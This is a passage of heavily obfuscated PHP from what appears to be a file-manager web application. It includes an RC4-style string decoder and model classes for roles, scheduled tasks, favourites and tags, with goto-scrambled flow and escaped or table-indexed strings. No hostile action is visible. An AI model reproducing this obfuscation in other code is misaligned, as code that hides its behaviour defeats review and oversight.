$aÍƒßñ÷ïä[$Få¶£Í∆˘∑] = $fÙà”¨ëŒµ; $d≠ñŒÉ âﬁ .= chr(ord($F°∂ö¿¨øç[$dÕ öﬂ…¶æ]) ^ $aÍƒßñ÷ïä[($aÍƒßñ÷ïä[$B…ãéÇêª“] + $aÍƒßñ÷ïä[$Få¶£Í∆˘∑]) % 256]); } $eÙã÷Î≠ñÆ = intval(substr($d≠ñŒÉ âﬁ, 0, 10)); goto a¯’Àé¿òí; d“˘√öß™Õ: $Cã–Ωç€‡£ =& $_SERVER[—Ω]; $F°∂ö¿¨øç = str_replace(array($Cã–Ωç€‡£[408], $Cã–Ωç€‡£[70], $Cã–Ωç€‡£[93]), array($Cã–Ωç€‡£[281], $Cã–Ωç€‡£[8], $Cã–Ωç€‡£[913]), $F°∂ö¿¨øç); $BÍÇà™˜‘¢ = 4; goto Cç¡◊©‡¶⁄; Cç¡◊©‡¶⁄: $BΩæ€ú∑–ñ = md5($BΩæ€ú∑–ñ ? $BΩæ€ú∑–ñ : self::$defaultKey); $fï≈‘ëÙã¢ = md5(substr($BΩæ€ú∑–ñ, 0, 16)); $Aáº’ÈÚ…î = md5(substr($BΩæ€ú∑–ñ, 16, 16)); goto FµËø¶÷≈ç; FµËø¶÷≈ç: $a¶Ó©öÌπÏ = substr($F°∂ö¿¨øç, 0, $BÍÇà™˜‘¢); $bˆ∂èôÔ‘’ = $fï≈‘ëÙã¢ . md5($fï≈‘ëÙã¢ . $a¶Ó©öÌπÏ); $aÖ¥˘Î–∞è = strlen($bˆ∂èôÔ‘’); goto Bêáß’äü≤; Bêáß’äü≤: $F°∂ö¿¨øç = base64_decode(substr($F°∂ö¿¨øç, $BÍÇà™˜‘¢)); $cﬂÙ’‚ìöâ = strlen($F°∂ö¿¨øç); $eæ’áöøáÃ = array(); goto cóí¬ÿ≈§∂; cóí¬ÿ≈§∂: for ($dÕ öﬂ…¶æ = 0; $dÕ öﬂ…¶æ <= 255; $dÕ öﬂ…¶æ++) { $eæ’áöøáÃ[$dÕ öﬂ…¶æ] = ord($bˆ∂èôÔ‘’[$dÕ öﬂ…¶æ % $aÖ¥˘Î–∞è]); } $aÍƒßñ÷ïä = range(0, 255); for ($Få¶£Í∆˘∑ = $dÕ öﬂ…¶æ = 0; $dÕ öﬂ…¶æ < 256; $dÕ öﬂ…¶æ++) { $Få¶£Í∆˘∑ = ($Få¶£Í∆˘∑ + $aÍƒßñ÷ïä[$dÕ öﬂ…¶æ] + $eæ’áöøáÃ[$dÕ öﬂ…¶æ]) % 256; $fÙà”¨ëŒµ = $aÍƒßñ÷ïä[$dÕ öﬂ…¶æ]; $aÍƒßñ÷ïä[$dÕ öﬂ…¶æ] = $aÍƒßñ÷ïä[$Få¶£Í∆˘∑]; $aÍƒßñ÷ïä[$Få¶£Í∆˘∑] = $fÙà”¨ëŒµ; } goto d£ôé¨‰™§; DÚµ¬»Ç£∞: } } goto déíññèèå; d”Æêœºç‚: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\56\162\x6f\x6c\x65\x4c\x69\x73\164"; public $field = array("\156\141\x6d\145", "\x61\165\x74\150", "\x6c\x61\142\145\x6c", "\144\151\163\x70\x6c\x61\171", "\x73\x79\163\164\145\155", "\144\145\163\x63", "\151\x67\x6e\x6f\x72\x65\105\170\164", "\x69\x67\156\x6f\162\x65\106\151\x6c\x65\123\x69\172\145", "\x61\144\x6d\x69\156\151\163\164\x72\141\164\157\162", "\163\157\x72\x74"); public function listData($E¨ØÜÁç¡¶ = false, $Bê®àËèÀê = "\x73\x6f\x72\x74", $f√›ë‡«Ñ´ = false) { return parent::listData($E¨ØÜÁç¡¶, $Bê®àËèÀê, $f√›ë‡«Ñ´); } public function update($c‘‰îâÕÒü, $cËøë†¿ı´) { goto fÿ‹•úÁïﬂ; e“á≈¯÷Îá: return parent::update($c‘‰îâÕÒü, $cËøë†¿ı´); goto DÙ∞èëÃﬂñ; fÿ‹•úÁïﬂ: $f›ÌÔ§êà∑ =& $_SERVER[—Ω]; $D∞ £ÉàÃ§ = parent::listData($c‘‰îâÕÒü); $dÈÁ§‹√ë¶ = $this->findByName($cËøë†¿ı´[$f›ÌÔ§êà∑[28]]); goto Fﬁ¬Æ›äöŸ; Fﬁ¬Æ›äöŸ: if (!$D∞ £ÉàÃ§ || $dÈÁ§‹√ë¶ && $dÈÁ§‹√ë¶[$f›ÌÔ§êà∑[364]] != $D∞ £ÉàÃ§[$f›ÌÔ§êà∑[364]]) { return !1; } if ($dÈÁ§‹√ë¶[$f›ÌÔ§êà∑[2446]] == 1) { $cËøë†¿ı´ = array($f›ÌÔ§êà∑[28] => $cËøë†¿ı´[$f›ÌÔ§êà∑[28]], $f›ÌÔ§êà∑[2098] => $cËøë†¿ı´[$f›ÌÔ§êà∑[2098]]); } $this->filterAuth($cËøë†¿ı´[$f›ÌÔ§êà∑[373]]); goto e“á≈¯÷Îá; DÙ∞èëÃﬂñ: } public function remove($B†¡ﬁèﬁˆ¶) { $B∫ÿºÓ∫Œ† = parent::listData($B†¡ﬁèﬁˆ¶); if (!$B∫ÿºÓ∫Œ† || $B∫ÿºÓ∫Œ†[$_SERVER[—Ω][1084]]) { return !1; } return parent::remove($B†¡ﬁèﬁˆ¶); } public function add($dÇôÛ‹∂√à) { goto D–ì§”€¯•; aùí≠äú•›: $câó¶é˘û = array($Eà◊Ç∞Ÿ∏ñ[383] => $Cë¢ÇÑÔ∂ﬂ, $Eà◊Ç∞Ÿ∏ñ[2086] => $Eà◊Ç∞Ÿ∏ñ[33], $Eà◊Ç∞Ÿ∏ñ[2082] => $Eà◊Ç∞Ÿ∏ñ[2099], $Eà◊Ç∞Ÿ∏ñ[2447] => 1, $Eà◊Ç∞Ÿ∏ñ[2085] => 0, $Eà◊Ç∞Ÿ∏ñ[2448] => 0, $Eà◊Ç∞Ÿ∏ñ[2084] => $this->getSort()); $dÇôÛ‹∂√à = array_merge($câó¶é˘û, $dÇôÛ‹∂√à); $this->filterAuth($dÇôÛ‹∂√à[$Eà◊Ç∞Ÿ∏ñ[373]]); goto f°∏ïÙ¢é‹; D–ì§”€¯•: $Eà◊Ç∞Ÿ∏ñ =& $_SERVER[—Ω]; $Cë¢ÇÑÔ∂ﬂ = $dÇôÛ‹∂√à[$Eà◊Ç∞Ÿ∏ñ[28]]; if ($this->findByName($Cë¢ÇÑÔ∂ﬂ)) { return !1; } goto aùí≠äú•›; f°∏ïÙ¢é‹: return parent::insert($dÇôÛ‹∂√à); goto câ±ŒŒ Ç´; câ±ŒŒ Ç´: } private function getSort() { $aëÊ‚°ÖƒÍ =& $_SERVER[—Ω]; $f‘èÜ∆»…± = parent::listData(); $FÑõ Ì«∆å = array_to_keyvalue($f‘èÜ∆»…±, $aëÊ‚°ÖƒÍ[33], $aëÊ‚°ÖƒÍ[2101]); return empty($FÑõ Ì«∆å) ? 0 : max($FÑõ Ì«∆å) + 1; } private function filterAuth(&$CÂΩÃø¯óÀ) { $bÑ±≠¡ÈèÑ =& $_SERVER[—Ω]; $eááÓäú… = array(); $A‚„â†Ê„ = array_filter(explode($bÑ±≠¡ÈèÑ[47], $CÂΩÃø¯óÀ)); foreach ($A‚„â†Ê„ as $CÂΩÃø¯óÀ) { $D»€Ö°ßÿ = explode($bÑ±≠¡ÈèÑ[93], $CÂΩÃø¯óÀ); if ($D»€Ö°ßÿ[0] == $bÑ±≠¡ÈèÑ[1760] && $D»€Ö°ßÿ[1] != $bÑ±≠¡ÈèÑ[1040]) { $fÉû«´ŒÉø = $D»€Ö°ßÿ[0] . $bÑ±≠¡ÈèÑ[93] . $D»€Ö°ßÿ[1] . $bÑ±≠¡ÈèÑ[2449]; if (!in_array($fÉû«´ŒÉø, $A‚„â†Ê„)) { $eááÓäú…[] = $fÉû«´ŒÉø; } } $eááÓäú…[] = $CÂΩÃø¯óÀ; } $CÂΩÃø¯óÀ = implode($bÑ±≠¡ÈèÑ[47], $eááÓäú…); } public function sort($BÚ°‚÷Ü†È, $d§•É¢Ùèö) { return parent::update($BÚ°‚÷Ü†È, $d§•É¢Ùèö); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\x2e\x74\141\163\153\114\151\x73\164"; public $field = array("\156\x61\155\x65", "\x74\x79\x70\145", "\x65\166\145\x6e\x74", "\164\x69\155\x65", "\x64\145\163\x63", "\163\x79\163\x74\145\155", "\145\x6e\141\142\154\x65", "\x6c\141\163\164\x52\x75\x6e", "\163\x6f\x72\x74"); public function listData($eûã¨©£ô≈ = false, $F‚©¯Áô£¨ = "\163\x6f\x72\164", $Aªèéí∫•˘ = false) { return parent::listData($eûã¨©£ô≈, $F‚©¯Áô£¨, $Aªèéí∫•˘); } public function add($dÔæÎî§ü⁄) { $D‚∑ã≈≠·ù =& $_SERVER[—Ω]; $Bç§¨áß¥• = $this->findByName($dÔæÎî§ü⁄[$D‚∑ã≈≠·ù[28]]); if ($Bç§¨áß¥•) { return !1; } $dÔæÎî§ü⁄[$D‚∑ã≈≠·ù[1382]] = 0; $dÔæÎî§ü⁄[$D‚∑ã≈≠·ù[2101]] = $this->getSort(); return parent::insert($dÔæÎî§ü⁄); } private function getSort() { $cáÇÜ≤Ëèà =& $_SERVER[—Ω]; $e⁄ÆÉ»∏àç = parent::listData(); $b∂®áçÌ≥à = array_to_keyvalue($e⁄ÆÉ»∏àç, $cáÇÜ≤Ëèà[33], $cáÇÜ≤Ëèà[2101]); return empty($b∂®áçÌ≥à) ? 0 : max($b∂®áçÌ≥à) + 1; } public function update($aô≈”©ˆÈ€, $e≈âç•‘¢î) { $e˜ãçï›ﬁü =& $_SERVER[—Ω]; $bŒ¬ï‹ëÏã = $this->listData($aô≈”©ˆÈ€); $Fö„£ûÒ«ÿ = $this->findByName($e≈âç•‘¢î[$e˜ãçï›ﬁü[28]]); if (!$bŒ¬ï‹ëÏã || $Fö„£ûÒ«ÿ && $Fö„£ûÒ«ÿ[$e˜ãçï›ﬁü[364]] != $bŒ¬ï‹ëÏã[$e˜ãçï›ﬁü[364]]) { return !1; } return parent::update($aô≈”©ˆÈ€, $e≈âç•‘¢î); } public function remove($e§êã·¥«ÿ, $FëŸ∫‡Æé» = false) { $Fì≠¡ùöÿó =& $_SERVER[—Ω]; $e˘‰§ÏÉËÛ = $this->listData($e§êã·¥«ÿ); if (!$e˘‰§ÏÉËÛ) { return; } if (!$FëŸ∫‡Æé» && $e˘‰§ÏÉËÛ[$Fì≠¡ùöÿó[1084]] == $Fì≠¡ùöÿó[83]) { return !1; } return parent::remove($e§êã·¥«ÿ); } public function enable($cú·ﬂœãÑñ, $A†∂êÍÖúÔ) { return $this->update($cú·ﬂœãÑñ, array($_SERVER[—Ω][2440] => $A†∂êÍÖúÔ)); } public function run($cê∏ﬁ¢œöÛ) { return $this->update($cê∏ﬁ¢œöÛ, array($_SERVER[—Ω][2450] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\145\x72\x5f\x66\x61\x76"; protected function cacheFunctionAlias($B∂Ù–÷†π‰) { $EË±ßŒ“Öû =& $_SERVER[—Ω]; return array($EË±ßŒ“Öû[2451] => array(USER_ID, $EË±ßŒ“Öû[2452])); } protected function listData() { $DàöØ®¢ïë =& $_SERVER[—Ω]; $fçÚ ˆ±ØÉ = array($DàöØ®¢ïë[1408] => USER_ID, $DàöØ®¢ïë[432] => 0); $C†ÿˆ¢´é≥ = $DàöØ®¢ïë[2453]; $fÇ«óÿÉãÑ = $this->field($C†ÿˆ¢´é≥)->where($fçÚ ˆ±ØÉ)->order($DàöØ®¢ïë[2454])->select(); return $fÇ«óÿÉãÑ ? $fÇ«óÿÉãÑ : array(); } protected function resetCache() { } protected function listView() { goto AëŸÖÈ ©¿; E Ò°≈¶Î£: $bâÍ˜´°á’ = array_to_keyvalue($bâÍ˜´°á’, $a∂ëÕñ¢Ëƒ[366]); foreach ($CµÕË®«√í as $F⁄˘“ë”Ç◊ => $E“ŸŸÜÏ‡í) { $dÔ√Èè´¯∏ = $bâÍ˜´°á’[$E“ŸŸÜÏ‡í[$a∂ëÕñ¢Ëƒ[75]]]; $dÔ√Èè´¯∏ = $dÔ√Èè´¯∏ ? $dÔ√Èè´¯∏ : array(); $CµÕË®«√í[$F⁄˘“ë”Ç◊] = array_merge($dÔ√Èè´¯∏, $E“ŸŸÜÏ‡í); } return $CµÕË®«√í; goto c°®åº⁄»∞; cÂÉòÿœ≥å: $eÛÆπ◊å¨∞ = array($a∂ëÕñ¢Ëƒ[380] => array($a∂ëÕñ¢Ëƒ[381], $Bªûôü€é„)); $bâÍ˜´°á’ = Model($a∂ëÕñ¢Ëƒ[762])->listSource($eÛÆπ◊å¨∞, $a°ÇÀÜÑÊ§); $bâÍ˜´°á’ = array_merge($bâÍ˜´°á’[$a∂ëÕñ¢Ëƒ[73]], $bâÍ˜´°á’[$a∂ëÕñ¢Ëƒ[74]]); goto E Ò°≈¶Î£; Dñ£Ç‡¶ã¨: $Bªûôü€é„ = array_to_keyvalue($C«ˆëâÎ‘Ø, $a∂ëÕñ¢Ëƒ[33], $a∂ëÕñ¢Ëƒ[75]); if (!$Bªûôü€é„) { return $CµÕË®«√í; } $a°ÇÀÜÑÊ§ = 2000; goto cÂÉòÿœ≥å; AëŸÖÈ ©¿: $a∂ëÕñ¢Ëƒ =& $_SERVER[—Ω]; $CµÕË®«√í = $this->listData(); $C«ˆëâÎ‘Ø = array_filter_by_field($CµÕË®«√í, $a∂ëÕñ¢Ëƒ[29], $a∂ëÕñ¢Ëƒ[379]); goto Dñ£Ç‡¶ã¨; c°®åº⁄»∞: } protected function addFav($C»ãÌõ¡çì, $e≠âíë…±ÿ = '', $Dâûó£¥√∫ = "\x73\157\x75\x72\143\x65") { goto F¿‡¶‹…æ∞; C »Ö‰ÊåÙ: if (!$e≠âíë…±ÿ && $Dâûó£¥√∫ == $F•É–û”Ω∂[379]) { $a®–ç´∞Ëü = Model($F•É–û”Ω∂[1114])->where(array($F•É–û”Ω∂[380] => $C»ãÌõ¡çì))->find(); if (!$a®–ç´∞Ëü) { return !1; } $e≠âíë…±ÿ = $a®–ç´∞Ëü[$F•É–û”Ω∂[28]]; } $e≠âíë…±ÿ = $this->getAutoName($e≠âíë…±ÿ); $aâ†√∏∑´Ñ = array($F•É–û”Ω∂[1408] => USER_ID, $F•É–û”Ω∂[432] => 0, $F•É–û”Ω∂[383] => $e≠âíë…±ÿ, $F•É–û”Ω∂[384] => $C»ãÌõ¡çì, $F•É–û”Ω∂[385] => $Dâûó£¥√∫, $F•É–û”Ω∂[2084] => $Eñ÷ò’Éò´ + 1); goto EŒã¡¿®◊©; EŒã¡¿®◊©: return $this->add($aâ†√∏∑´Ñ); goto d◊¨––áêØ; cæ‚‹â∆ª√: $fÛÚ»∞ë≈Ñ = array($F•É–û”Ω∂[1408] => USER_ID, $F•É–û”Ω∂[432] => 0); $Eñ÷ò’Éò´ = $this->where($fÛÚ»∞ë≈Ñ)->max($F•É–û”Ω∂[2101]); if (!$Eñ÷ò’Éò´) { $Eñ÷ò’Éò´ = 0; } goto C »Ö‰ÊåÙ; F¿‡¶‹…æ∞: $F•É–û”Ω∂ =& $_SERVER[—Ω]; $fÛÚ»∞ë≈Ñ = array($F•É–û”Ω∂[1408] => USER_ID, $F•É–û”Ω∂[432] => 0, $F•É–û”Ω∂[385] => $Dâûó£¥√∫, $F•É–û”Ω∂[384] => $C»ãÌõ¡çì); if ($this->where($fÛÚ»∞ë≈Ñ)->find()) { return !1; } goto cæ‚‹â∆ª√; d◊¨––áêØ: } protected function remove($f”‰¶¢ﬂåÂ) { $fÌ¶ï›ïÚÓ =& $_SERVER[—Ω]; $CŸƒ‚ Ω€° = array($fÌ¶ï›ïÚÓ[1408] => USER_ID, $fÌ¶ï›ïÚÓ[382] => $f”‰¶¢ﬂåÂ); return $this->where($CŸƒ‚ Ω€°)->delete(); } protected function removeByName($bïëåÉ™∏‡) { $BŸã‡ÍÔûê =& $_SERVER[—Ω]; $cãñ≤„êùâ = array($BŸã‡ÍÔûê[1408] => USER_ID, $BŸã‡ÍÔûê[383] => $bïëåÉ™∏‡, $BŸã‡ÍÔûê[432] => 0); return $this->where($cãñ≤„êùâ)->delete(); } protected function rename($b’ëÉÂ˘ì , $BÚÍÜäÛÚ∫) { $aç¨Á≠œÛ§ =& $_SERVER[—Ω]; if ($b’ëÉÂ˘ì  == $BÚÍÜäÛÚ∫) { return !1; } $eΩç©ÌŒÍ∞ = $this->getAutoName($BÚÍÜäÛÚ∫); if ($BÚÍÜäÛÚ∫ != $eΩç©ÌŒÍ∞) { return !1; } $CË€¥”©˘÷ = array($aç¨Á≠œÛ§[1408] => USER_ID, $aç¨Á≠œÛ§[432] => 0, $aç¨Á≠œÛ§[28] => $b’ëÉÂ˘ì ); return $this->where($CË€¥”©˘÷)->save(array($aç¨Á≠œÛ§[28] => $BÚÍÜäÛÚ∫)); } protected function resetSort($Dª≤ƒïÍ•õ) { $AÓ˘£≈Æ©Ü =& $_SERVER[—Ω]; $Dª≤ƒïÍ•õ = is_array($Dª≤ƒïÍ•õ) ? $Dª≤ƒïÍ•õ : array(); $DíæÁ›ê™¢ = array($AÓ˘£≈Æ©Ü[1408] => USER_ID); for ($D¿ƒçôø»í = 0; $D¿ƒçôø»í < count($Dª≤ƒïÍ•õ); $D¿ƒçôø»í++) { $DíæÁ›ê™¢[$AÓ˘£≈Æ©Ü[382]] = $Dª≤ƒïÍ•õ[$D¿ƒçôø»í]; $this->where($DíæÁ›ê™¢)->save(array($AÓ˘£≈Æ©Ü[2084] => $D¿ƒçôø»í + 1)); } return !0; } protected function moveTop($dı¢ï£‡◊±) { goto Fë·åÑ¶√©; E∏Ü¬“Àñà: $c¡™ˆîΩØØ = $Cù…ﬂﬁ·ä¨; $Cù…ﬂﬁ·ä¨ = array_remove_value($Cù…ﬂﬁ·ä¨, $EŒîÃÔêûı[$AØ⁄”Ã»û[364]]); array_unshift($Cù…ﬂﬁ·ä¨, $EŒîÃÔêûı[$AØ⁄”Ã»û[364]]); goto AÌÏô•é∆¥; AÌÏô•é∆¥: return $this->resetSort($Cù…ﬂﬁ·ä¨); goto e≤ç†¬Áå≤; Fë·åÑ¶√©: $AØ⁄”Ã»û =& $_SERVER[—Ω]; $a‡ü®ÔûïÆ = array($AØ⁄”Ã»û[1408] => USER_ID, $AØ⁄”Ã»û[432] => 0); $EŒîÃÔêûı = $this->where($a‡ü®ÔûïÆ)->where(array($AØ⁄”Ã»û[28] => $dı¢ï£‡◊±))->find(); goto A¯°Ø¶õ§¬; A¯°Ø¶õ§¬: if (!$EŒîÃÔêûı) { return; } $Cù…ﬂﬁ·ä¨ = $this->field($AØ⁄”Ã»û[364])->where($a‡ü®ÔûïÆ)->order($AØ⁄”Ã»û[2454])->select(); $Cù…ﬂﬁ·ä¨ = array_to_keyvalue($Cù…ﬂﬁ·ä¨, $AØ⁄”Ã»û[33], $AØ⁄”Ã»û[364]); goto E∏Ü¬“Àñà; e≤ç†¬Áå≤: } protected function moveBottom($Dâ”ﬁåÌ≥á) { $dÈ≠™Ωù¿Û =& $_SERVER[—Ω]; $F≥ÆÜÔøœÎ = array($dÈ≠™Ωù¿Û[1408] => USER_ID, $dÈ≠™Ωù¿Û[432] => 0); $b£óæùúëÙ = $this->where($F≥ÆÜÔøœÎ)->max($dÈ≠™Ωù¿Û[2101]); $F£ìõÉíùÿ = array($dÈ≠™Ωù¿Û[2101] => $b£óæùúëÙ + 1); return $this->where($F≥ÆÜÔøœÎ)->where(array($dÈ≠™Ωù¿Û[28] => $Dâ”ﬁåÌ≥á))->save($F£ìõÉíùÿ); } private function getAutoName($b¬Êê’◊È∂) { goto bõø¢·≈Ò‡; bõø¢·≈Ò‡: $eƒÀé±Ñî =& $_SERVER[—Ω]; $dò¥û„ñ–– = array($eƒÀé±Ñî[1408] => USER_ID, $eƒÀé±Ñî[432] => 0); $dËïÁÕ˜ùç = $this->field($eƒÀé±Ñî[28])->where($dò¥û„ñ––)->select(); goto E·ﬂÊ∏õÆù; E·ﬂÊ∏õÆù: $dËïÁÕ˜ùç = array_to_keyvalue($dËïÁÕ˜ùç, $eƒÀé±Ñî[33], $eƒÀé±Ñî[28]); if (!$dËïÁÕ˜ùç || !in_array($b¬Êê’◊È∂, $dËïÁÕ˜ùç)) { return $b¬Êê’◊È∂; } for ($eáìáåÙò≥ = 0; $eáìáåÙò≥ < count($dËïÁÕ˜ùç); $eáìáåÙò≥++) { if (!in_array($b¬Êê’◊È∂ . "\50{$eáìáåÙò≥}\51", $dËïÁÕ˜ùç)) { return $b¬Êê’◊È∂ . "\x28{$eáìáåÙò≥}\51"; } } goto AÙê‹±íÆ∏; AÙê‹±íÆ∏: return $b¬Êê’◊È∂ . "\x28{$eáìáåÙò≥}\51"; goto B«Í∑ÛÜÊø; B«Í∑ÛÜÊø: } } goto bú•ƒ¯Ö‚Ç; E€÷ªÊ¨ˆê: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\145\x72\137\146\141\x76"; protected function cacheFunctionAlias($DËÑ∆•ÎÓä) { $e¨ª–úòüÉ =& $_SERVER[—Ω]; return array($e¨ª–úòüÉ[2451] => array(USER_ID, $e¨ª–úòüÉ[2507])); } protected function listData() { $EÏÒÓ¡ﬁ“É =& $_SERVER[—Ω]; $eôŸ◊ãÚÁÇ = array($EÏÒÓ¡ﬁ“É[1408] => USER_ID, $EÏÒÓ¡ﬁ“É[432] => array($EÏÒÓ¡ﬁ“É[2508], 0)); $CÜÌä´Ç°æ = $EÏÒÓ¡ﬁ“É[2509]; $b¯ØÌòé‚‹ = $EÏÒÓ¡ﬁ“É[2510]; $DÕªùª√¡Ì = $this->field($CÜÌä´Ç°æ)->where($eôŸ◊ãÚÁÇ)->order($b¯ØÌòé‚‹)->select(); return $DÕªùª√¡Ì ? $DÕªùª√¡Ì : array(); } protected function listByTag($Fø…◊∏Òù’) { } protected function addToTag($béöÇ’ç∫®, $Eé≈Ç÷≠Ÿ¨) { $e÷»‘è¢•Ï =& $_SERVER[—Ω]; if (!Model($e÷»‘è¢•Ï[2280])->listData($Eé≈Ç÷≠Ÿ¨) || !Model($e÷»‘è¢•Ï[762])->pathInfo($béöÇ’ç∫®)) { return !1; } $bçÒÂëÉª‰ = array($e÷»‘è¢•Ï[1408] => USER_ID, $e÷»‘è¢•Ï[432] => $Eé≈Ç÷≠Ÿ¨, $e÷»‘è¢•Ï[384] => $béöÇ’ç∫®, $e÷»‘è¢•Ï[385] => $e÷»‘è¢•Ï[379], $e÷»‘è¢•Ï[383] => $e÷»‘è¢•Ï[33], $e÷»‘è¢•Ï[2084] => 0); if ($this->where($bçÒÂëÉª‰)->find()) { return !1; } return $this->add($bçÒÂëÉª‰); } protected function removeFromTag($aÊ”´óëªÉ, $C∆óæä‘¯™) { $b• øÏÍÔâ =& $_SERVER[—Ω]; if (!Model($b• øÏÍÔâ[2280])->listData($C∆óæä‘¯™) || !Model($b• øÏÍÔâ[762])->pathInfo($aÊ”´óëªÉ)) { return !1; } $a∞Ô›ô‹¡Â = array($b• øÏÍÔâ[1408] => USER_ID, $b• øÏÍÔâ[432] => $C∆óæä‘¯™, $b• øÏÍÔâ[385] => $b• øÏÍÔâ[379], $b• øÏÍÔâ[384] => $aÊ”´óëªÉ); return $this->where($a∞Ô›ô‹¡Â)->delete(); } protected function removeByTag($fØﬂªàÀ–Ë) { $e÷‚Ãæˆ™° =& $_SERVER[—Ω]; if (!$fØﬂªàÀ–Ë) { return !1; } $DûπÖ˜Ø¯Ó = array($e÷‚Ãæˆ™°[1408] => USER_ID, $e÷‚Ãæˆ™°[432] => $fØﬂªàÀ–Ë); return $this->where($DûπÖ˜Ø¯Ó)->delete(); } protected function removeBySource($a¡£Õ†àñ‘) { $aì≠»ÿÕÆ∆ =& $_SERVER[—Ω]; $C¥Öô≠Ωí¥ = array($aì≠»ÿÕÆ∆[1408] => USER_ID, $aì≠»ÿÕÆ∆[384] => $a¡£Õ†àñ‘, $aì≠»ÿÕÆ∆[432] => array($aì≠»ÿÕÆ∆[934], 0)); return $this->where($C¥Öô≠Ωí¥)->delete(); } }